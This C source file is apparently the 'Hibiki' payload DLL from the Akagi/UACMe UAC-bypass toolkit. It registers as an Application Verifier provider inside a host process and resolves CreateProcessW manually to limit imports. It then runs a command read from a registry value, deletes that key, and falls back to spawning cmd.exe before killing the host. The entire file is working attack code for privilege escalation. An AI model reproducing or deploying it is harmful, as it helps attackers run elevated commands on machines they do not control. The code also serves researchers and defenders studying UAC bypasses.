/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     2.70
*
*  DATE:        21 Mar 2017
*
*  AVrf entry point, Hibiki Kai Ni.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u

#include <windows.h>
#include <ntstatus.h>
#include "shared\ntos.h"
#include "shared\minirtl.h"


#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define Msg            "Hibiki at your service, Admiral"
#define T_AKAGI_KEY    L"\\Software\\Akagi"
#define T_AKAGI_PARAM  L"LoveLetter"

#define DLL_PROCESS_VERIFIER 4

typedef BOOL(WINAPI* pfnCreateProcessW)(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );

typedef VOID(NTAPI * RTL_VERIFIER_DLL_LOAD_CALLBACK) (PWSTR DllName, PVOID DllBase, SIZE_T DllSize, PVOID Reserved);

typedef struct _RTL_VERIFIER_THUNK_DESCRIPTOR {
    PCHAR ThunkName;
    PVOID ThunkOldAddress;
    PVOID ThunkNewAddress;
} RTL_VERIFIER_THUNK_DESCRIPTOR, *PRTL_VERIFIER_THUNK_DESCRIPTOR;

typedef struct _RTL_VERIFIER_DLL_DESCRIPTOR {
    PWCHAR DllName;
    DWORD DllFlags;
    PVOID DllAddress;
    PRTL_VERIFIER_THUNK_DESCRIPTOR DllThunks;
} RTL_VERIFIER_DLL_DESCRIPTOR, *PRTL_VERIFIER_DLL_DESCRIPTOR;

typedef struct _RTL_VERIFIER_PROVIDER_DESCRIPTOR {
    DWORD Length;
    PRTL_VERIFIER_DLL_DESCRIPTOR ProviderDlls;
    RTL_VERIFIER_DLL_LOAD_CALLBACK ProviderDllLoadCallback;
    PVOID ProviderDllUnloadCallback;
    PWSTR VerifierImage;
    DWORD VerifierFlags;
    DWORD VerifierDebug;
    PVOID RtlpGetStackTraceAddress;
    PVOID RtlpDebugPageHeapCreate;
    PVOID RtlpDebugPageHeapDestroy;
    PVOID ProviderNtdllHeapFreeCallback;
} RTL_VERIFIER_PROVIDER_DESCRIPTOR, *PRTL_VERIFIER_PROVIDER_DESCRIPTOR;

static RTL_VERIFIER_PROVIDER_DESCRIPTOR g_avrfProvider;
static RTL_VERIFIER_THUNK_DESCRIPTOR avrfThunks[2];
static RTL_VERIFIER_DLL_DESCRIPTOR avrfDlls[2];
static HMODULE g_pvKernel32;

/*
* ucmLdrGetProcAddress
*
* Purpose:
*
* Reimplemented GetProcAddress to minimize kernel32 import.
*
*/
LPVOID ucmLdrGetProcAddress(
    PCHAR ImageBase,
    PCHAR RoutineName
)
{
    USHORT OrdinalNumber;
    PULONG NameTableBase;
    PUSHORT NameOrdinalTableBase;
    PULONG Addr;
    LONG Result, High, Low = 0, Middle = 0;
    LPVOID FunctionAddress = NULL;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;

    PIMAGE_FILE_HEADER			fh1 = NULL;
    PIMAGE_OPTIONAL_HEADER32	oh32 = NULL;
    PIMAGE_OPTIONAL_HEADER64	oh64 = NULL;

    fh1 = (PIMAGE_FILE_HEADER)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew + sizeof(DWORD));
    oh32 = (PIMAGE_OPTIONAL_HEADER32)((ULONG_PTR)fh1 + sizeof(IMAGE_FILE_HEADER));
    oh64 = (PIMAGE_OPTIONAL_HEADER64)oh32;

    if (fh1->Machine == IMAGE_FILE_MACHINE_AMD64) {
        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
            oh64->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    }
    else {
        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
            oh32->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    }

    NameTableBase = (PULONG)(ImageBase + (ULONG)ExportDirectory->AddressOfNames);
    NameOrdinalTableBase = (PUSHORT)(ImageBase + (ULONG)ExportDirectory->AddressOfNameOrdinals);
    High = ExportDirectory->NumberOfNames - 1;
    while (High >= Low) {

        Middle = (Low + High) >> 1;

        Result = _strcmpi_a(
            RoutineName,
            (PCHAR)(ImageBase + NameTableBase[Middle])
        );

        if (Result < 0)
            High = Middle - 1;
        else
            if (Result > 0)
                Low = Middle + 1;
            else
                break;
    } //while
    if (High < Low)
        return NULL;

    OrdinalNumber = NameOrdinalTableBase[Middle];
    if ((ULONG)OrdinalNumber >= ExportDirectory->NumberOfFunctions)
        return NULL;

    Addr = (PDWORD)((DWORD_PTR)ImageBase + ExportDirectory->AddressOfFunctions);
    FunctionAddress = (LPVOID)((DWORD_PTR)ImageBase + Addr[OrdinalNumber]);

    return FunctionAddress;
}

pfnCreateProcessW pCreateProcessW = NULL;

/*
* ucmGetStartupInfo
*
* Purpose:
*
* Reimplemented GetStartupInfoW to minimize kernel32 import.
*
*/
VOID ucmGetStartupInfo(
    LPSTARTUPINFOW lpStartupInfo
)
{
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;

    if (lpStartupInfo == NULL) {
        return;
    }

    ProcessParameters = NtCurrentPeb()->ProcessParameters;

    lpStartupInfo->cb = sizeof(*lpStartupInfo);
    lpStartupInfo->lpReserved = (LPWSTR)ProcessParameters->ShellInfo.Buffer;
    lpStartupInfo->lpDesktop = (LPWSTR)ProcessParameters->DesktopInfo.Buffer;
    lpStartupInfo->lpTitle = (LPWSTR)ProcessParameters->WindowTitle.Buffer;
    lpStartupInfo->dwX = ProcessParameters->StartingX;
    lpStartupInfo->dwY = ProcessParameters->StartingY;
    lpStartupInfo->dwXSize = ProcessParameters->CountX;
    lpStartupInfo->dwYSize = ProcessParameters->CountY;
    lpStartupInfo->dwXCountChars = ProcessParameters->CountCharsX;
    lpStartupInfo->dwYCountChars = ProcessParameters->CountCharsY;
    lpStartupInfo->dwFillAttribute = ProcessParameters->FillAttribute;
    lpStartupInfo->dwFlags = ProcessParameters->WindowFlags;
    lpStartupInfo->wShowWindow = (WORD)ProcessParameters->ShowWindowFlags;
    lpStartupInfo->cbReserved2 = ProcessParameters->RuntimeData.Length;
    lpStartupInfo->lpReserved2 = (LPBYTE)ProcessParameters->RuntimeData.Buffer;

    if (lpStartupInfo->dwFlags & (STARTF_USESTDHANDLES | STARTF_USEHOTKEY)) {
        lpStartupInfo->hStdInput = ProcessParameters->StandardInput;
        lpStartupInfo->hStdOutput = ProcessParameters->StandardOutput;
        lpStartupInfo->hStdError = ProcessParameters->StandardError;
    }
}

/*
* ucmExpandEnvironmentStrings
*
* Purpose:
*
* Reimplemented ExpandEnvironmetStrings to minimize kernel32 import.
*
*/
DWORD ucmExpandEnvironmentStrings(
    LPCWSTR lpSrc,
    LPWSTR lpDst,
    DWORD nSize
)
{
    NTSTATUS Status;
    UNICODE_STRING Source, Destination;
    ULONG Length;
    DWORD iSize;

    if (nSize > (MAXUSHORT >> 1) - 2) {
        iSize = (MAXUSHORT >> 1) - 2;
    }
    else {
        iSize = nSize;
    }

    RtlSecureZeroMemory(&Source, sizeof(Source));
    RtlInitUnicodeString(&Source, lpSrc);
    Destination.Buffer = lpDst;
    Destination.Length = 0;
    Destination.MaximumLength = (USHORT)(iSize * sizeof(WCHAR));
    Length = 0;
    Status = RtlExpandEnvironmentStrings_U(NULL,
        &Source,
        &Destination,
        &Length
    );
    if (NT_SUCCESS(Status) || Status == STATUS_BUFFER_TOO_SMALL) {
        return(Length / sizeof(WCHAR));
    }
    else {
        RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
        return 0;
    }
}

/*
* ucmQueryCustomParameter
*
* Purpose:
*
* Query custom parameter and run it.
*
*/
BOOL ucmQueryCustomParameter(
    VOID
)
{
    BOOL                    cond = FALSE, bResult = FALSE;

    OBJECT_ATTRIBUTES               obja;
    UNICODE_STRING                  usKey;
    NTSTATUS                        status;
    KEY_VALUE_PARTIAL_INFORMATION	keyinfo;

    SIZE_T                  memIO;
    HKEY                    hKey = NULL;
    PVOID                   ProcessHeap = NtCurrentPeb()->ProcessHeap;
    LPWSTR                  lpData = NULL, lpParameter = NULL, lpszParamKey = NULL;
    STARTUPINFOW            startupInfo;
    PROCESS_INFORMATION     processInfo;
    ULONG                   bytesIO = 0L;

    do {

        RtlSecureZeroMemory(&usKey, sizeof(usKey));
        status = RtlFormatCurrentUserKeyPath(&usKey);
        if (!NT_SUCCESS(status)) {
            break;
        }

        memIO = (_strlen_w(T_AKAGI_KEY) * sizeof(WCHAR)) +
            usKey.MaximumLength + sizeof(UNICODE_NULL);

        lpszParamKey = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpszParamKey == NULL) {
            RtlFreeUnicodeString(&usKey);
            break;
        }

        _strcpy_w(lpszParamKey, usKey.Buffer);
        _strcat_w(lpszParamKey, T_AKAGI_KEY);
        RtlFreeUnicodeString(&usKey);

        RtlSecureZeroMemory(&usKey, sizeof(usKey));
        RtlInitUnicodeString(&usKey, lpszParamKey);
        InitializeObjectAttributes(&obja, &usKey, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlInitUnicodeString(&usKey, T_AKAGI_PARAM);
        status = NtQueryValueKey(hKey, &usKey, KeyValuePartialInformation, &keyinfo,
            sizeof(KEY_VALUE_PARTIAL_INFORMATION), &bytesIO);

        if ((status != STATUS_SUCCESS) &&
            (status != STATUS_BUFFER_TOO_SMALL) &&
            (status != STATUS_BUFFER_OVERFLOW))
        {
            break;
        }

        lpData = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, bytesIO);
        if (lpData == NULL) {
            break;
        }

        status = NtQueryValueKey(hKey, &usKey, KeyValuePartialInformation, lpData, bytesIO, &bytesIO);
        NtDeleteKey(hKey);
        NtClose(hKey);
        hKey = NULL;

        lpParameter = (LPWSTR)((PKEY_VALUE_PARTIAL_INFORMATION)lpData)->Data;
        if (lpParameter != NULL) {

            DbgPrint("Akagi letter found: %ws", lpParameter);

            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
            startupInfo.cb = sizeof(startupInfo);
            ucmGetStartupInfo(&startupInfo);

            bResult = pCreateProcessW(NULL, lpParameter, NULL, NULL, FALSE, 0, NULL,
                NULL, &startupInfo, &processInfo);

            if (bResult) {
                NtClose(processInfo.hProcess);
                NtClose(processInfo.hThread);
            }
        }

        RtlFreeHeap(ProcessHeap, 0, lpData);

    } while (cond);

    if (hKey != NULL) {
        NtDeleteKey(hKey);
        NtClose(hKey);
    }
    if (lpszParamKey != NULL) {
        RtlFreeHeap(ProcessHeap, 0, lpszParamKey);
    }

    return bResult;
}

/*
* ucmbRunTarget
*
* Purpose:
*
* Start target application.
*
*/
VOID ucmbRunTarget(
    VOID
)
{
    DWORD                   cch;
    TCHAR                   cmdbuf[MAX_PATH * 2], sysdir[MAX_PATH + 1];
    STARTUPINFOW            startupInfo;
    PROCESS_INFORMATION     processInfo;

    if (pCreateProcessW == NULL) {
        return;
    }

    if (!ucmQueryCustomParameter()) {
        RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
        RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
        startupInfo.cb = sizeof(startupInfo);
        ucmGetStartupInfo(&startupInfo);

        RtlSecureZeroMemory(sysdir, sizeof(sysdir));
        cch = ucmExpandEnvironmentStrings(L"%systemroot%\\system32\\", sysdir, MAX_PATH);
        if ((cch != 0) && (cch < MAX_PATH)) {
            RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
            _strcpy_w(cmdbuf, sysdir);
            _strcat_w(cmdbuf, L"cmd.exe");

            if (pCreateProcessW(cmdbuf, NULL, NULL, NULL, FALSE, 0, NULL,
                sysdir, &startupInfo, &processInfo))
            {
                NtClose(processInfo.hProcess);
                NtClose(processInfo.hThread);
            }
        }
    }
    NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
}

/*
* ucmLoadCallback
*
* Purpose:
*
* Image load notify callback, when kernel32 available - acquire import and run target application.
*
*/
VOID NTAPI ucmLoadCallback(
    PWSTR DllName,
    PVOID DllBase,
    SIZE_T DllSize,
    PVOID Reserved
)
{
    UNREFERENCED_PARAMETER(DllSize);
    UNREFERENCED_PARAMETER(Reserved);

    if (DllName == NULL) {
        return;
    }

    DbgPrint("ucmLoadCallback, dll load %ws, DllBase = %p\n\r", DllName, DllBase);

    if (_strcmpi_w(DllName, L"kernel32.dll") == 0) {
        g_pvKernel32 = DllBase;
        DbgPrint("ucmLoadCallback, kernel32 base found");
    }

    if (_strcmpi_w(DllName, L"user32.dll") == 0) {
        if (g_pvKernel32) {
            pCreateProcessW = ucmLdrGetProcAddress((PCHAR)g_pvKernel32, "CreateProcessW");
            if (pCreateProcessW != NULL) {
                ucmbRunTarget();
            }
        }
    }
}

/*
* ucmRegisterProvider
*
* Purpose:
*
* Register provider and set up image load notify callback.
*
*/
VOID ucmRegisterProvider(
    VOID
)
{
    RtlSecureZeroMemory(&avrfThunks, sizeof(avrfThunks)); //for future case

    avrfThunks[0].ThunkName = NULL;
    avrfThunks[0].ThunkOldAddress = NULL;
    avrfThunks[0].ThunkNewAddress = NULL;

    RtlSecureZeroMemory(&avrfDlls, sizeof(avrfDlls)); //for future case

    avrfDlls[0].DllName = NULL;
    avrfDlls[0].DllFlags = 0;
    avrfDlls[0].DllAddress = NULL;
    avrfDlls[0].DllThunks = avrfThunks;

    RtlSecureZeroMemory(&g_avrfProvider, sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR));
    g_avrfProvider.Length = sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR);
    g_avrfProvider.ProviderDlls = avrfDlls;
    g_avrfProvider.ProviderDllLoadCallback = (RTL_VERIFIER_DLL_LOAD_CALLBACK)&ucmLoadCallback;
}

/*
* DllMain
*
* Purpose:
*
* Verifier dll entry point, register verifier provider.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    PRTL_VERIFIER_PROVIDER_DESCRIPTOR* pVPD = lpvReserved;

    UNREFERENCED_PARAMETER(hinstDLL);

    switch (fdwReason) {

    case DLL_PROCESS_VERIFIER:
        DbgPrint("Put your signature here");
        DbgPrint(Msg);
        ucmRegisterProvider();
        *pVPD = &g_avrfProvider;
        break;
    }
    return TRUE;
}
